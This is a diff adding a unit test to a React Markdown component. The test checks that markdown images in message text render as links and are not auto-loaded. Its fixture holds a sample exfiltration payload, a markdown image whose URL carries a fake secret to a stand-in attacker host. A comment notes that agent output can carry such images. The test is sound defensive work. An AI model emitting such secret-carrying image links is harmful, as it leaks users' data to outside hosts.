@@ -29,6 +29,17 @@ describe("Markdown", () => {
     expect(screen.getAllByRole("checkbox")).toHaveLength(2);
   });
 
+  it("never auto-loads a remote image from message text", () => {
+    // Agent or synced text can carry ![](https://attacker/?q=<secret>); loading
+    // it on render sends the secret without a click.
+    const { container } = render(
+      <Markdown content={"see ![chart](https://evil.example/p.png?q=sk-secret)"} />,
+    );
+    expect(container.querySelector("img")).toBeNull();
+    const link = screen.getByRole("link", { name: /chart/ });
+    expect(link).toHaveAttribute("href", "https://evil.example/p.png?q=sk-secret");
+  });
+
   it("still renders gfm tables", () => {
     const { container } = render(
       <Markdown content={"| a | b |\n| - | - |\n| 1 | 2 |"} />,
